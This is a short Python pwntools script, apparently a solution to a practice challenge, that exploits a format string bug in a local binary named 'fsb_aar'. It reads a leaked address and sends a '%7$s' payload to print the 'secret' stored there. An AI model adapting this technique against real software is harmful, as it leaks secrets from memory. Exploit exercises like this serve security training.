from pwn import *

p = process('./fsb_aar')
p.recvuntil('`secret`: ')
addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%7$s".ljust(8)
fstring += p64(addr_secret)
p.sendline(fstring)
p.interactive()